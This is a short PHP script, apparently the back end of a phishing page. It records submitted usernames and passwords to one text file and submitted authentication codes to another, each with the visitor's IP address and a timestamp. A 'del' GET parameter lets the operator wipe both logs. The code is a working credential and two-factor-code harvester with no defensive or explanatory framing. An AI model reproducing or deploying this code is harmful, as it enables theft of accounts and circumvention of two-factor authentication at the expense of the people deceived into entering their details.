<?php 
	if( isset($_POST['username']) && isset($_POST['password'])){
		$username = $_POST['username']; 
		$password = $_POST['password']; 
		$ip = $_SERVER['REMOTE_ADDR']; 
		$date = date('d/m/Y?G:i:s');
		$fp = fopen("111.txt", "a+"); 
		$mytext = $username.";".$password.";".$ip.";".$date.PHP_EOL;
		fwrite($fp, $mytext);
		fclose($fp);
	}
	if( isset($_POST['authcode'])){
		$code = $_POST['authcode']; 
		$date = date('d/m/Y?G:i:s');
		$ip = $_SERVER['REMOTE_ADDR']; 
		$fp1 = fopen("222.txt", "a+"); 
		$mytext1 = $code.";".$ip.";".$date.PHP_EOL;
		fwrite($fp1, $mytext1);
		fclose($fp1);
	}
	if( isset($_GET['del'])){
		$fp1 = fopen("111.txt", "w"); 
		fclose($fp1);
		$fp1 = fopen("222.txt", "w"); 
		fclose($fp1);
	}

?>